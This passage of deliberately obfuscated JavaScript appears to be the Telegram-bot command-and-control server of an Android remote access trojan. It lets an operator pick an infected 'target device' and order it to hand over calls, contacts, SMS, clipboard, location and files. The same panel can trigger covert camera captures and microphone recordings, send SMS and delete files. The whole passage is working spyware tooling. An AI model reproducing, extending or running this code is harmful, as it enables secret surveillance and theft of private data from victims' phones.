          appBot[_0x3b4275(0xf8)](id, _0x3b4275(0xf6) + _0x3b4275(0xf7), {
            parse_mode: _0x3b4275(0x11e),
            reply_markup: {
              keyboard: [[_0x3b4275(0x178)], [_0x3b4275(0x134)]],
              resize_keyboard: !![],
            },
          });
      }
      if (
        _0x11cbf9[_0x3b4275(0x12b)][_0x3b4275(0x11f)][_0x3b4275(0x118)](
          _0x3b4275(0x17d)
        )
      ) {
        const _0x1652b1 = _0x11cbf9[_0x3b4275(0x11f)];
        appSocket[_0x3b4275(0x132)]["forEach"](function _0x1d5be5(_0x5f96bd) {
          const _0x5b65c6 = _0x3b4275;
          _0x5f96bd[_0x5b65c6(0x145)] == currentUuid &&
            _0x5f96bd[_0x5b65c6(0x103)](_0x5b65c6(0x16e) + _0x1652b1);
        }),
          (currentUuid = ""),
          appBot[_0x3b4275(0xf8)](id, _0x3b4275(0xf6) + _0x3b4275(0xf7), {
            parse_mode: "HTML",
            reply_markup: {
              keyboard: [[_0x3b4275(0x178)], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚\x20𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
              resize_keyboard: !![],
            },
          });
      }
      if (
        _0x11cbf9[_0x3b4275(0x12b)][_0x3b4275(0x11f)]["includes"](
          _0x3b4275(0x14d)
        )
      ) {
        const _0x38f86c = _0x11cbf9["text"];
        appSocket["clients"][_0x3b4275(0x175)](function _0xeb0793(_0x315ea9) {
          const _0x409689 = _0x3b4275;
          _0x315ea9["uuid"] == currentUuid &&
            _0x315ea9[_0x409689(0x103)](_0x409689(0x17e) + _0x38f86c);
        }),
          (currentUuid = ""),
          appBot[_0x3b4275(0xf8)](
            id,
            _0x3b4275(0xf6) +
              "•\x20ʏᴏᴜ\x20ᴡɪʟʟ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴀ\x20ʀᴇꜱᴘᴏɴꜱᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ɴᴇxᴛ\x20ꜰᴇᴡ\x20ᴍᴏᴍᴇɴᴛꜱ",
            {
              parse_mode: _0x3b4275(0x11e),
              reply_markup: {
                keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], [_0x3b4275(0x134)]],
                resize_keyboard: !![],
              },
            }
          );
      }
      if (
        _0x11cbf9["reply_to_message"][_0x3b4275(0x11f)]["includes"](
          _0x3b4275(0x17c)
        )
      ) {
        const _0x233ce5 = _0x11cbf9[_0x3b4275(0x11f)];
        appSocket[_0x3b4275(0x132)]["forEach"](function _0x441679(_0x5e8361) {
          const _0xd07b8c = _0x3b4275;
          _0x5e8361[_0xd07b8c(0x145)] == currentUuid &&
            _0x5e8361[_0xd07b8c(0x103)](_0xd07b8c(0x10d) + _0x233ce5);
        }),
          (currentUuid = ""),
          appBot["sendMessage"](
            id,
            "°•\x20𝙔𝙤𝙪𝙧\x20𝙧𝙚𝙦𝙪𝙚𝙨𝙩\x20𝙞𝙨\x20𝙤𝙣\x20𝙥𝙧𝙤𝙘𝙚𝙨𝙨\x0a\x0a" +
              _0x3b4275(0xf7),
            {
              parse_mode: _0x3b4275(0x11e),
              reply_markup: {
                keyboard: [[_0x3b4275(0x178)], [_0x3b4275(0x134)]],
                resize_keyboard: !![],
              },
            }
          );
      }
      if (
        _0x11cbf9[_0x3b4275(0x12b)][_0x3b4275(0x11f)][_0x3b4275(0x118)](
          _0x3b4275(0x10b)
        )
      ) {
        const _0x3fc95b = _0x11cbf9[_0x3b4275(0x11f)];
        appSocket["clients"][_0x3b4275(0x175)](function _0x22f82a(_0x2ae347) {
          const _0x29cc80 = _0x3b4275;
          _0x2ae347[_0x29cc80(0x145)] == currentUuid &&
            _0x2ae347["send"](_0x29cc80(0xf2) + _0x3fc95b);
        }),
          (currentUuid = ""),
          appBot[_0x3b4275(0xf8)](
            id,
            _0x3b4275(0xf6) +
              "•\x20ʏᴏᴜ\x20ᴡɪʟʟ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴀ\x20ʀᴇꜱᴘᴏɴꜱᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ɴᴇxᴛ\x20ꜰᴇᴡ\x20ᴍᴏᴍᴇɴᴛꜱ",
            {
              parse_mode: _0x3b4275(0x11e),
              reply_markup: {
                keyboard: [[_0x3b4275(0x178)], [_0x3b4275(0x134)]],
                resize_keyboard: !![],
              },
            }
          );
      }
      if (
        _0x11cbf9[_0x3b4275(0x12b)][_0x3b4275(0x11f)][_0x3b4275(0x118)](
          "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙝𝙤𝙬\x20𝙡𝙤𝙣𝙜\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙝𝙚\x20𝙨𝙚𝙡𝙛𝙞𝙚\x20𝙘𝙖𝙢𝙚𝙧𝙖\x20𝙩𝙤\x20𝙗𝙚\x20𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙"
        )
      ) {
        const _0x40662f = _0x11cbf9[_0x3b4275(0x11f)];
        appSocket[_0x3b4275(0x132)][_0x3b4275(0x175)](function _0x513eb8(
          _0x51aa2e
        ) {
          const _0x3688b5 = _0x3b4275;
          _0x51aa2e[_0x3688b5(0x145)] == currentUuid &&
            _0x51aa2e[_0x3688b5(0x103)](_0x3688b5(0xe2) + _0x40662f);
        }),
          (currentUuid = ""),
          appBot[_0x3b4275(0xf8)](id, _0x3b4275(0xf6) + _0x3b4275(0xf7), {
            parse_mode: _0x3b4275(0x11e),
            reply_markup: {
              keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚\x20𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
              resize_keyboard: !![],
            },
          });
      }
      if (
        _0x11cbf9[_0x3b4275(0x12b)][_0x3b4275(0x11f)][_0x3b4275(0x118)](
          _0x3b4275(0x138)
        )
      ) {
        const _0x19eead = _0x11cbf9[_0x3b4275(0x11f)];
        appSocket[_0x3b4275(0x132)][_0x3b4275(0x175)](function _0x16ad1f(
          _0x2a977d
        ) {
          const _0x77e15c = _0x3b4275;
          _0x2a977d[_0x77e15c(0x145)] == currentUuid &&
            _0x2a977d[_0x77e15c(0x103)]("toast:" + _0x19eead);
        }),
          (currentUuid = ""),
          appBot["sendMessage"](
            id,
            _0x3b4275(0xf6) +
              "•\x20ʏᴏᴜ\x20ᴡɪʟʟ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴀ\x20ʀᴇꜱᴘᴏɴꜱᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ɴᴇxᴛ\x20ꜰᴇᴡ\x20ᴍᴏᴍᴇɴᴛꜱ",
            {
              parse_mode: _0x3b4275(0x11e),
              reply_markup: {
                keyboard: [[_0x3b4275(0x178)], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚\x20𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                resize_keyboard: !![],
              },
            }
          );
      }
      if (
        _0x11cbf9[_0x3b4275(0x12b)]["text"][_0x3b4275(0x118)](_0x3b4275(0x107))
      ) {
        const _0xa945dd = _0x11cbf9[_0x3b4275(0x11f)];
        (currentTitle = _0xa945dd),
          appBot[_0x3b4275(0xf8)](id, _0x3b4275(0xfb) + _0x3b4275(0xe8), {
            reply_markup: { force_reply: !![] },
          });
      }
      if (
        _0x11cbf9[_0x3b4275(0x12b)][_0x3b4275(0x11f)][_0x3b4275(0x118)](
          _0x3b4275(0x16a)
        )
      ) {
        const _0x523afa = _0x11cbf9[_0x3b4275(0x11f)];
        appSocket[_0x3b4275(0x132)][_0x3b4275(0x175)](function _0x104ab1(
          _0x393cbb
        ) {
          const _0xc52c79 = _0x3b4275;
          _0x393cbb[_0xc52c79(0x145)] == currentUuid &&
            _0x393cbb[_0xc52c79(0x103)](
              _0xc52c79(0x124) + currentTitle + "/" + _0x523afa
            );
        }),
          (currentUuid = ""),
          appBot[_0x3b4275(0xf8)](
            id,
            _0x3b4275(0xf6) +
              "•\x20ʏᴏᴜ\x20ᴡɪʟʟ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴀ\x20ʀᴇꜱᴘᴏɴꜱᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ɴᴇxᴛ\x20ꜰᴇᴡ\x20ᴍᴏᴍᴇɴᴛꜱ",
            {
              parse_mode: _0x3b4275(0x11e),
              reply_markup: {
                keyboard: [[_0x3b4275(0x178)], [_0x3b4275(0x134)]],
                resize_keyboard: !![],
              },
            }
          );
      }
      if (
        _0x11cbf9[_0x3b4275(0x12b)][_0x3b4275(0x11f)][_0x3b4275(0x118)](
          _0x3b4275(0x12f)
        )
      ) {
        const _0x7a9ff3 = _0x11cbf9["text"];
        appSocket[_0x3b4275(0x132)][_0x3b4275(0x175)](function _0x1c2c07(
          _0x138d4d
        ) {
          const _0xa5a73f = _0x3b4275;
          _0x138d4d["uuid"] == currentUuid &&
            _0x138d4d[_0xa5a73f(0x103)](_0xa5a73f(0x17a) + _0x7a9ff3);
        }),
          (currentUuid = ""),
          appBot[_0x3b4275(0xf8)](id, _0x3b4275(0xf6) + _0x3b4275(0xf7), {
            parse_mode: _0x3b4275(0x11e),
            reply_markup: {
              keyboard: [[_0x3b4275(0x178)], [_0x3b4275(0x134)]],
              resize_keyboard: !![],
            },
          });
      }
    }
    if (id == _0x118285) {
      _0x11cbf9[_0x3b4275(0x11f)] == _0x3b4275(0x11a) &&
        appBot[_0x3b4275(0xf8)](
          id,
          _0x3b4275(0xfe) +
            "•\x20ɪꜰ\x20ᴛʜᴇ\x20ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ\x20ɪꜱ\x20ɪɴꜱᴛᴀʟʟᴇᴅ\x20ᴏɴ\x20ᴛʜᴇ\x20ᴛᴀʀɢᴇᴛ\x20ᴅᴇᴠɪᴄᴇ,\x20ᴡᴀɪᴛ\x20ꜰᴏʀ\x20ᴛʜᴇ\x20ᴄᴏɴɴᴇᴄᴛɪᴏɴ\x0a\x0a" +
            _0x3b4275(0xef) +
            _0x3b4275(0x163) +
            "•\x20ɪꜰ\x20ʏᴏᴜ\x20ɢᴇᴛ\x20ꜱᴛᴜᴄᴋ\x20ꜱᴏᴍᴇᴡʜᴇʀᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ʙᴏᴛ,\x20ꜱᴇɴᴅ\x20/start\x20ᴄᴏᴍᴍᴀɴᴅ",
          {
            parse_mode: _0x3b4275(0x11e),
            reply_markup: {
              keyboard: [[_0x3b4275(0x178)], [_0x3b4275(0x134)]],
              resize_keyboard: !![],
            },
          }
        );
      if (_0x11cbf9[_0x3b4275(0x11f)] == _0x3b4275(0x178)) {
        if (appClients[_0x3b4275(0x16f)] == 0x0)
          appBot["sendMessage"](
            id,
            "°•\x20𝙉𝙤\x20𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨\x20𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\x0a\x0a" +
              _0x3b4275(0x117)
          );
        else {
          let _0x5a94da =
            "°•\x20𝙇𝙞𝙨𝙩\x20𝙤𝙛\x20𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨\x20:\x0a\x0a";
          appClients[_0x3b4275(0x175)](function (
            _0x3bf86c,
            _0x1ba42a,
            _0x5ae8f3
          ) {
            const _0x4f03b0 = _0x3b4275;
            _0x5a94da +=
              "•\x20ᴅᴇᴠɪᴄᴇ\x20ᴍᴏᴅᴇʟ\x20:\x20<b>" +
              _0x3bf86c[_0x4f03b0(0x128)] +
              _0x4f03b0(0x116) +
              (_0x4f03b0(0x100) +
                _0x3bf86c[_0x4f03b0(0x143)] +
                _0x4f03b0(0x116)) +
              (_0x4f03b0(0x17b) + _0x3bf86c["version"] + "</b>\x0a") +
              (_0x4f03b0(0xed) + _0x3bf86c[_0x4f03b0(0xf1)] + "</b>\x0a") +
              (_0x4f03b0(0xe6) +
                _0x3bf86c[_0x4f03b0(0x13f)] +
                _0x4f03b0(0x120));
          }),
            appBot["sendMessage"](id, _0x5a94da, {
              parse_mode: _0x3b4275(0x11e),
            });
        }
      }
      if (_0x11cbf9["text"] == "𝙀𝙭𝙚𝙘𝙪𝙩𝙚\x20𝙘𝙤𝙢𝙢𝙖𝙣𝙙") {
        if (appClients[_0x3b4275(0x16f)] == 0x0)
          appBot[_0x3b4275(0xf8)](id, _0x3b4275(0xf3) + _0x3b4275(0x117));
        else {
          const _0x3b9a83 = [];
          appClients[_0x3b4275(0x175)](function (
            _0x4eb067,
            _0x4a3ac4,
            _0x54efb4
          ) {
            const _0x24c3e6 = _0x3b4275;
            _0x3b9a83[_0x24c3e6(0x171)]([
              {
                text: _0x4eb067["model"],
                callback_data: _0x24c3e6(0xe9) + _0x4a3ac4,
              },
            ]);
          }),
            appBot["sendMessage"](id, _0x3b4275(0x112), {
              reply_markup: { inline_keyboard: _0x3b9a83 },
            });
        }
      }
    } else appBot["sendMessage"](id, _0x3b4275(0xfd));
  }),
  appBot["on"](_0x8ea7c8(0x179), (_0x1262e0) => {
    const _0xe6b2b9 = _0x8ea7c8,
      _0x3c50cb = _0x1262e0[_0xe6b2b9(0x126)],
      _0x274198 = _0x1262e0[_0xe6b2b9(0x11b)],
      _0x3b1368 = _0x274198[_0xe6b2b9(0x122)](":")[0x0],
      _0x5346ac = _0x274198[_0xe6b2b9(0x122)](":")[0x1];
    console[_0xe6b2b9(0x153)](_0x5346ac),
      _0x3b1368 == _0xe6b2b9(0x115) &&
        appBot[_0xe6b2b9(0x14f)](
          _0xe6b2b9(0x17f) +
            appClients[_0xe6b2b9(0x113)](_0x274198[_0xe6b2b9(0x122)](":")[0x1])[
              _0xe6b2b9(0x128)
            ] +
            _0xe6b2b9(0x165),
          {
            width: 0x2710,
            chat_id: id,
            message_id: _0x3c50cb[_0xe6b2b9(0x11c)],
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: _0xe6b2b9(0x13b),
                    callback_data: _0xe6b2b9(0x152) + _0x5346ac,
                  },
                  {
                    text: _0xe6b2b9(0x158),
                    callback_data: _0xe6b2b9(0x176) + _0x5346ac,
                  },
                ],
                [
                  {
                    text: _0xe6b2b9(0x101),
                    callback_data: _0xe6b2b9(0x16e) + _0x5346ac,
                  },
                  {
                    text: _0xe6b2b9(0xe3),
                    callback_data: _0xe6b2b9(0x17e) + _0x5346ac,
                  },
                ],
                [
                  {
                    text: _0xe6b2b9(0x141),
                    callback_data: _0xe6b2b9(0x169) + _0x5346ac,
                  },
                  {
                    text: _0xe6b2b9(0x12e),
                    callback_data: _0xe6b2b9(0x10d) + _0x5346ac,
                  },
                ],
                [
                  {
                    text: _0xe6b2b9(0x125),
                    callback_data: _0xe6b2b9(0xf4) + _0x5346ac,
                  },
                  {
                    text: _0xe6b2b9(0x14a),
                    callback_data: _0xe6b2b9(0x133) + _0x5346ac,
                  },
                ],
                [
                  {
                    text: _0xe6b2b9(0x14b),
                    callback_data: _0xe6b2b9(0xf0) + _0x5346ac,
                  },
                  {
                    text: _0xe6b2b9(0x150),
                    callback_data: "toast:" + _0x5346ac,
                  },
                ],
                [
                  {
                    text: _0xe6b2b9(0x15b),
                    callback_data: "calls:" + _0x5346ac,
                  },
                  {
                    text: "𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
                    callback_data: _0xe6b2b9(0x147) + _0x5346ac,
                  },
                ],
                [
                  {
                    text: _0xe6b2b9(0x15c),
                    callback_data: "vibrate:" + _0x5346ac,
                  },
                  {
                    text: _0xe6b2b9(0xeb),
                    callback_data: _0xe6b2b9(0x124) + _0x5346ac,
                  },
                ],
                [
                  {
                    text: _0xe6b2b9(0x162),
                    callback_data: "messages:" + _0x5346ac,
                  },
                  {
                    text: _0xe6b2b9(0x10c),
                    callback_data: "send_message:" + _0x5346ac,
                  },
                ],
                [
                  {
                    text: "𝙋𝙡𝙖𝙮\x20𝙖𝙪𝙙𝙞𝙤",
                    callback_data: _0xe6b2b9(0x17a) + _0x5346ac,
                  },
                  {
                    text: _0xe6b2b9(0x121),
                    callback_data: "stop_audio:" + _0x5346ac,
                  },
                ],
                [
                  {
                    text: _0xe6b2b9(0x168),
                    callback_data: _0xe6b2b9(0x104) + _0x5346ac,
                  },
                ],
              ],
            },
            parse_mode: _0xe6b2b9(0x11e),
          }
        ),
      _0x3b1368 == "calls" &&
        (appSocket["clients"][_0xe6b2b9(0x175)](function _0x122d02(_0x3067f2) {
          const _0x50d2d1 = _0xe6b2b9;
          _0x3067f2[_0x50d2d1(0x145)] == _0x5346ac &&
            _0x3067f2["send"](_0x50d2d1(0xec));
        }),
        appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0xf6) + _0xe6b2b9(0xf7), {
          parse_mode: _0xe6b2b9(0x11e),
          reply_markup: {
            keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], [_0xe6b2b9(0x134)]],
            resize_keyboard: !![],
          },
        })),
      _0x3b1368 == _0xe6b2b9(0x130) &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x43a1bd(
          _0x301ef3
        ) {
          const _0x27971b = _0xe6b2b9;
          _0x301ef3[_0x27971b(0x145)] == _0x5346ac &&
            _0x301ef3[_0x27971b(0x103)](_0x27971b(0x130));
        }),
        appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb["message_id"]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0xf6) + _0xe6b2b9(0xf7), {
          parse_mode: _0xe6b2b9(0x11e),
          reply_markup: {
            keyboard: [[_0xe6b2b9(0x178)], [_0xe6b2b9(0x134)]],
            resize_keyboard: !![],
          },
        })),
      _0x3b1368 == _0xe6b2b9(0x149) &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x236d95(
          _0x33a4c6
        ) {
          const _0x3e721f = _0xe6b2b9;
          _0x33a4c6[_0x3e721f(0x145)] == _0x5346ac &&
            _0x33a4c6["send"]("messages");
        }),
        appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb["message_id"]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0xf6) + _0xe6b2b9(0xf7), {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [[_0xe6b2b9(0x178)], [_0xe6b2b9(0x134)]],
            resize_keyboard: !![],
          },
        })),
      _0x3b1368 == _0xe6b2b9(0xfc) &&
        (appSocket[_0xe6b2b9(0x132)]["forEach"](function _0x32e3a1(_0x2dc6d9) {
          const _0x4a252d = _0xe6b2b9;
          _0x2dc6d9["uuid"] == _0x5346ac &&
            _0x2dc6d9[_0x4a252d(0x103)](_0x4a252d(0xfc));
        }),
        appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](
          id,
          "°•\x20𝙔𝙤𝙪𝙧\x20𝙧𝙚𝙦𝙪𝙚𝙨𝙩\x20𝙞𝙨\x20𝙤𝙣\x20𝙥𝙧𝙤𝙘𝙚𝙨𝙨\x0a\x0a" +
            _0xe6b2b9(0xf7),
          {
            parse_mode: "HTML",
            reply_markup: {
              keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], [_0xe6b2b9(0x134)]],
              resize_keyboard: !![],
            },
          }
        )),
      _0x3b1368 == _0xe6b2b9(0x123) &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x12e5dd(
          _0x423b78
        ) {
          const _0x2e6fdc = _0xe6b2b9;
          _0x423b78[_0x2e6fdc(0x145)] == _0x5346ac &&
            _0x423b78[_0x2e6fdc(0x103)](_0x2e6fdc(0x123));
        }),
        appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb["message_id"]),
        appBot["sendMessage"](id, _0xe6b2b9(0xf6) + _0xe6b2b9(0xf7), {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [[_0xe6b2b9(0x178)], [_0xe6b2b9(0x134)]],
            resize_keyboard: !![],
          },
        })),
      _0x3b1368 == "clipboard" &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x3009ef(
          _0x4b8a53
        ) {
          const _0x35e360 = _0xe6b2b9;
          _0x4b8a53[_0x35e360(0x145)] == _0x5346ac &&
            _0x4b8a53[_0x35e360(0x103)]("clipboard");
        }),
        appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0xf6) + _0xe6b2b9(0xf7), {
          parse_mode: _0xe6b2b9(0x11e),
          reply_markup: {
            keyboard: [[_0xe6b2b9(0x178)], [_0xe6b2b9(0x134)]],
            resize_keyboard: !![],
          },
        })),
      _0x3b1368 == "camera_main" &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x11f2ec(
          _0x35905c
        ) {
          const _0x1991aa = _0xe6b2b9;
          _0x35905c[_0x1991aa(0x145)] == _0x5346ac &&
            _0x35905c[_0x1991aa(0x103)](_0x1991aa(0x109));
        }),
        appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0xf6) + _0xe6b2b9(0xf7), {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], [_0xe6b2b9(0x134)]],
            resize_keyboard: !![],
          },
        })),
      _0x3b1368 == _0xe6b2b9(0x159) &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x2ac55d(
          _0x2095d0
        ) {
          const _0x2cbb9f = _0xe6b2b9;
          _0x2095d0[_0x2cbb9f(0x145)] == _0x5346ac &&
            _0x2095d0["send"](_0x2cbb9f(0x159));
        }),
        appBot["deleteMessage"](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0xf6) + _0xe6b2b9(0xf7), {
          parse_mode: _0xe6b2b9(0x11e),
          reply_markup: {
            keyboard: [[_0xe6b2b9(0x178)], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚\x20𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
            resize_keyboard: !![],
          },
        })),
      _0x3b1368 == "location" &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x4e044d(
          _0x5af290
        ) {
          const _0x3a0ea7 = _0xe6b2b9;
          _0x5af290["uuid"] == _0x5346ac &&
            _0x5af290[_0x3a0ea7(0x103)]("location");
        }),
        appBot["deleteMessage"](id, _0x3c50cb["message_id"]),
        appBot["sendMessage"](
          id,
          _0xe6b2b9(0xf6) +
            "•\x20ʏᴏᴜ\x20ᴡɪʟʟ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴀ\x20ʀᴇꜱᴘᴏɴꜱᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ɴᴇxᴛ\x20ꜰᴇᴡ\x20ᴍᴏᴍᴇɴᴛꜱ",
          {
            parse_mode: _0xe6b2b9(0x11e),
            reply_markup: {
              keyboard: [[_0xe6b2b9(0x178)], [_0xe6b2b9(0x134)]],
              resize_keyboard: !![],
            },
          }
        )),
      _0x3b1368 == "vibrate" &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x3273a5(
          _0x5d3f6f
        ) {
          const _0x3f90fd = _0xe6b2b9;
          _0x5d3f6f[_0x3f90fd(0x145)] == _0x5346ac &&
            _0x5d3f6f[_0x3f90fd(0x103)](_0x3f90fd(0x177));
        }),
        appBot["deleteMessage"](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](
          id,
          _0xe6b2b9(0xf6) +
            "•\x20ʏᴏᴜ\x20ᴡɪʟʟ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴀ\x20ʀᴇꜱᴘᴏɴꜱᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ɴᴇxᴛ\x20ꜰᴇᴡ\x20ᴍᴏᴍᴇɴᴛꜱ",
          {
            parse_mode: "HTML",
            reply_markup: {
              keyboard: [[_0xe6b2b9(0x178)], [_0xe6b2b9(0x134)]],
              resize_keyboard: !![],
            },
          }
        )),
      _0x3b1368 == _0xe6b2b9(0x142) &&
        (appSocket[_0xe6b2b9(0x132)][_0xe6b2b9(0x175)](function _0x143ce6(
          _0x2ea7ec
        ) {
          const _0x44f90b = _0xe6b2b9;
          _0x2ea7ec[_0x44f90b(0x145)] == _0x5346ac &&
            _0x2ea7ec[_0x44f90b(0x103)](_0x44f90b(0x142));
        }),
        appBot["deleteMessage"](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot["sendMessage"](id, _0xe6b2b9(0xf6) + _0xe6b2b9(0xf7), {
          parse_mode: _0xe6b2b9(0x11e),
          reply_markup: {
            keyboard: [[_0xe6b2b9(0x178)], [_0xe6b2b9(0x134)]],
            resize_keyboard: !![],
          },
        })),
      _0x3b1368 == _0xe6b2b9(0x114) &&
        (appBot["deleteMessage"](id, _0x3c50cb["message_id"]),
        appBot["sendMessage"](id, _0xe6b2b9(0x174) + _0xe6b2b9(0x157), {
          reply_markup: { force_reply: !![] },
        }),
        (currentUuid = _0x5346ac)),
      _0x3b1368 == _0xe6b2b9(0x161) &&
        (appBot["deleteMessage"](id, _0x3c50cb["message_id"]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0x15f) + _0xe6b2b9(0xf9), {
          reply_markup: { force_reply: !![] },
        }),
        (currentUuid = _0x5346ac)),
      _0x3b1368 == "file" &&
        (appBot["deleteMessage"](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](
          id,
          _0xe6b2b9(0x10a) +
            "•\x20ʏᴏᴜ\x20ᴅᴏ\x20ɴᴏᴛ\x20ɴᴇᴇᴅ\x20ᴛᴏ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ꜰᴜʟʟ\x20ꜰɪʟᴇ\x20ᴘᴀᴛʜ,\x20ᴊᴜꜱᴛ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ᴍᴀɪɴ\x20ᴘᴀᴛʜ.\x20ꜰᴏʀ\x20ᴇxᴀᴍᴘʟᴇ,\x20ᴇɴᴛᴇʀ<b>\x20DCIM/Camera\x20</b>\x20ᴛᴏ\x20ʀᴇᴄᴇɪᴠᴇ\x20ɢᴀʟʟᴇʀʏ\x20ꜰɪʟᴇꜱ.",
          { reply_markup: { force_reply: !![] }, parse_mode: "HTML" }
        ),
        (currentUuid = _0x5346ac)),
      _0x3b1368 == "delete_file" &&
        (appBot["deleteMessage"](id, _0x3c50cb["message_id"]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0x12c) + _0xe6b2b9(0x119), {
          reply_markup: { force_reply: !![] },
          parse_mode: "HTML",
        }),
        (currentUuid = _0x5346ac)),
      _0x3b1368 == "microphone" &&
        (appBot["deleteMessage"](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](
          id,
          _0xe6b2b9(0x16b) +
            "•\x20ɴᴏᴛᴇ\x20ᴛʜᴀᴛ\x20ʏᴏᴜ\x20ᴍᴜꜱᴛ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ᴛɪᴍᴇ\x20ɴᴜᴍᴇʀɪᴄᴀʟʟʏ\x20ɪɴ\x20ᴜɴɪᴛꜱ\x20ᴏꜰ\x20ꜱᴇᴄᴏɴᴅꜱ",
          { reply_markup: { force_reply: !![] }, parse_mode: _0xe6b2b9(0x11e) }
        ),
        (currentUuid = _0x5346ac)),
      _0x3b1368 == _0xe6b2b9(0xee) &&
        (appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot[_0xe6b2b9(0xf8)](id, _0xe6b2b9(0x129) + _0xe6b2b9(0x135), {
          reply_markup: { force_reply: !![] },
          parse_mode: _0xe6b2b9(0x11e),
        }),
        (currentUuid = _0x5346ac)),
      _0x3b1368 == _0xe6b2b9(0x172) &&
        (appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb[_0xe6b2b9(0x11c)]),
        appBot["sendMessage"](id, _0xe6b2b9(0x160) + _0xe6b2b9(0x140), {
          reply_markup: { force_reply: !![] },
          parse_mode: _0xe6b2b9(0x11e),
        }),
        (currentUuid = _0x5346ac)),
      _0x3b1368 == _0xe6b2b9(0xea) &&
        (appBot[_0xe6b2b9(0x14e)](id, _0x3c50cb["message_id"]),
        appBot[_0xe6b2b9(0xf8)](
          id,
          "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙖𝙪𝙙𝙞𝙤\x20𝙡𝙞𝙣𝙠\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙥𝙡𝙖𝙮\x0a\x0a" +
            _0xe6b2b9(0x13d),
